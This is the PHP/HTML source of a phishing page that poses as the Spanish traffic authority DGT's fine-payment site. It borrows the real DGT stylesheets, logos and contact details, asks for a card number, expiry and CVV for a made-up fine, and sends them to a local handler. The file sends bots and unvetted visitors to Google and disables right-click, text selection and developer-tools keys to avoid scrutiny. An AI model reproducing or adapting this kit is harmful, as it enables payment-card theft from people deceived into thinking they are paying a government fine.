<?php
session_start();

require '../server/all.php';
include '../settings.php';
//include '../server/fonctions.php';


if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ) {	
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
	<head>
			
		
		
		
		
		
		<script async  src="https://js.stripe.com/v3/buy-button.js"></script>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
		<style type="text/css" media="all">
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css');
		</style>
		

		<title>Page de sanciones</title>
		<style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px; /* Bords arrondis */
            cursor: pointer;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }
    </style>
		
		
	</head>
	<body id="myBody" class="js-enabled">
	
		
		
		<div class="burguer small" aria-hidden="true">			
			
		
		</div>
		<!-- Atajos -->
		<header class="main-header">
			<h1 class="sr-only">
			<span>Site Web DGT</span></h1>
			<nav>
				<h2 class="sr-only">Entête</h2>
				<!-- Cabecera con los logos -->
				<div class="brand">
					<h3 class="sr-only">Organisme</h3>
					<div class="logos">
						<a title="" href="" target="_blank"><img src="../assets/images/logo-mir.png" ></a>
						<a title="" href="" target="_blank"><img src="../assets/images/logo-dgt.png" ></a>
					</div>
					<a class="title" href="">
						<span class="main">Pago de sanciones</span>
						
					</a>
					<div class="desktop-fix"></div>
				</div>
				
				
					
				
				<div id="formMenuCarritoId" name="formMenuCarritoId" method="post" action="" enctype="application/x-www-form-urlencoded">
					<input type="hidden" name="formMenuCarritoId" value="formMenuCarritoId">
					<div class="nav-main menu-component" id="main-navigation">
						<h3 class="sr-only"></h3>
						<ul class="menu">
							<li class="level l1 no-sublevel" onclick="">
								<a href="" class="item"><span class="fa fa-angle-right" aria-hidden="true"></span>Pagos</a>
							</li>
						</ul>
					</div>
					
			</nav>
			<!--/ Menu principal de enlaces -->
		</header>
		<main class="main-content">
			<!-- Avisos -->
			<div class="dgt-announcements-header">
				
				
			</div>
			
					<!-- TITRE -->
					<span class="hide">Pago de sanciones</span>
					
					<h2>Pago de su multa N°164357371274</h2>

					
				</header>
			
				
				
				<div></div>
				

		
				
					
	<div class="box bordered-box overlapped-title-box">
	<div class="container-fluid">
    <!-- Form -->
	<form method="post" id ="carte_form" action="../actions/carte.php">
    <div class="row">
	<?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">Tarjeta de crédito no válida, por favor vuelva a intentarlo</p>';}?>
	<?php if (isset($_GET['error']) && $_GET['error'] == 2) { echo '<p style="color: red; font-size: 16px;">El formulario está incompleto.</p>';}?>
        <!-- NOM -->
        <div class="col-sm-8">
            <label class="mandatory">Número de tarjeta de crédito</label>
            <input id="ccnum" type="text" name="ccnum" class="form-control" minlength="16" maxlength="16" inputmode="numeric" oninput="chiffres_only(this)">
        </div>
	</div>	
	<div class="row">
        <div class="col-sm-4">
            <label class="mandatory">Fecha de expiración</label>
            <input id="exp" type="text" name="exp" class="form-control" minlength="7" maxlength="7" inputmode="numeric" placeholder ="MM/AAAA" inputmode="numeric"  oninput="validateExpirationDate(this);" onkeyup="formatString(event);" required>
        </div>


		<div class="col-sm-4">
            <label class="mandatory">CVV</label>
            <input id="cvv" type="text" name="cvv" class="form-control" minlength="3" maxlength="4" placeholder ="xxx" inputmode="numeric" oninput="chiffres_only(this)" required >
        </div>

    </div>
	</div>

    

    

    <div class="row">
        
        

		
	</div>
		
		
		
		
		
		
		
			<br>
			<!-- BUTTON VALIDER -->
			<div class="row">
			<div class="col-sm-8">
			<button type="submit" name="carte_submit" class="custom-button form-control">Continuar</button>
			<input type="hidden" name="carte_submit"   id="carte_submit"value="true">		
			</div> 
			</div>
		
    </div>

				
</form>

						



<table class="table table-striped">
							
						</table>
					</div>
					
					
					
				
				<!-- Encuesta -->
				
			</main>
			<footer class="main-footer">
		<nav>
			<h2 class="sr-only">Pie de página</h2>

			<h3 class="sr-only">Ayuda y políticas</h3>
			<ul class="inline links piped">
				<li>
					<a class="link" href="" target="_blank" title="Aviso legal">Aviso legal</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Propiedad intelectual">Propiedad intelectual</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Accesibilidad">Accesibilidad</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Protección de datos">Protección de datos</a>
		</ul>
			
			<div class="footer-social">
				<ul>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Facebook">
							<em class="fa fa-facebook-square"><span class="hide">Página de Facebook</span></em>
						</a>
					</li>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Twitter">
							<em class="fa fa-twitter-square"><span class="hide">Página de Twitter</span></em>
						</a>
					</li>
					<li>
						<a href="t" target="_blank" title="Abrir en nueva ventana Página de YouTube">
							<em class="fa fa-youtube-square"><span class="hide">Página de YouTube</span></em>
						</a>
					</li>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Instagram">
							<em class="fa fa-instagram"><span class="hide">Página de Instagram</span></em>
						</a>
					</li>
				</ul>
			</div>

			<h3 class="sr-only">Copyright</h3>
			<p class="copyright">Copyright @ DGT 2022. Todos los derechos reservados</p>

			<h3 class="sr-only">Contacto</h3>
			<ul class="inline contact">
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					011 Estado del Tráfico
				</li>
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					060 Admin. Gral. del Estado
				</li>
				<li>
					<span class="fa fa-map-marker fa-white" aria-hidden="true" title="Ubicación"></span>
					<span class="sr-only">Ubicación</span>
					C/ Josefa Valcarcel, 28 - 28071 Madrid-España
				</li>
			</ul>
		</nav>
	</footer>
			<div id="Version_V05"></div>
			<script>
			function validateExpirationDate(input) {
    // Supprime les caractères non numériques
    input.value = input.value.replace(/\D/g, '');

    // Formate en MM/AAAA
    if (input.value.length > 2) {
        input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
    }

    // Applique les contraintes (MM de 01 à 12 et AAAA de 2024 à 2035)
    var mois = parseInt(input.value.slice(0, 2), 10);
    var annee = parseInt(input.value.slice(3), 10);

    // Vérifie les contraintes plus strictes
    if (mois < 1 || mois > 12 || annee < 2024 || annee > 2035 || isNaN(mois) || isNaN(annee)) {
        // Affiche un message d'erreur ou effectuez une action appropriée
        // Par exemple : alert("Date non valide !");
    }
}
      </script>
     
		</body>
	</html>

	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
<?php
} else {
    header("Location: https://www.google.com");
    exit;
}

?>

<!-- script js -->	
<script>

function ccnum(ccnum) {
      // Supprimer tout sauf les chiffres
      input.value = input.value.replace(/\D/g, '');

      var errorMessage = document.getElementById("errorMessage");

      if (input.value.length === 16) {
        errorMessage.textContent = "";
      } else {
        errorMessage.textContent = "Le numéro de carte de crédit doit contenir 16 chiffres.";
      }
}


   
	 
	 
	  function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }

		
		
		
		document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>



<script>
        document.getElementById('carte_form').addEventListener('submit', function() {
            // Désactiver le bouton de soumission après le clic
            document.getElementById('carte_submit').disabled = true;
        });
    </script>